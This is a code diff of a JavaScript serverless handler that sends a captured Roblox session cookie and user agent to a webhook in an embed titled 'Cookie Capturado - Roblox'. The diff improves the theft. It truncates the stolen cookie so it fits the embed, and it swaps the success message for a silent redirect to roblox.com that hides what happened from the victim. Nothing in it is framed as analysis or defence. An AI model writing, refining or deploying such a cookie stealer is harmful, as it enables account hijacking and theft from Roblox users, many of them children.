@@ -14,10 +14,10 @@ export default async function handler(req) {
       embeds: [
         {
           title: "Cookie Capturado - Roblox",
-          color: 15158332, // vermelho
+          color: 15158332,
           fields: [
-            { name: "Cookie", value: `\`\`\`${cookie}\`\`\``.slice(0, 1024), inline: false },
-            { name: "User Agent", value: `\`\`\`${userAgent}\`\`\``.slice(0, 1024), inline: false },
+            { name: "Cookie", value: `\`\`\`${cookie.slice(0, 1010)}\`\`\``, inline: false },
+            { name: "User Agent", value: `\`\`\`${userAgent.slice(0, 1010)}\`\`\``, inline: false },
             { name: "Host", value: "roblox.com", inline: true },
             { name: "Timestamp", value: new Date().toISOString(), inline: true },
           ],
@@ -31,8 +31,9 @@ export default async function handler(req) {
       body: JSON.stringify(payload),
     });
 
-    return new Response("Enviado com sucesso!", { status: 200 });
+    // Redireciona após sucesso
+    return Response.redirect("https://www.roblox.com", 302);
   } catch (e) {
-    return new Response("Erro no envio", { status: 500 });
+    return new Response("Erro ao enviar", { status: 500 });
   }
 }
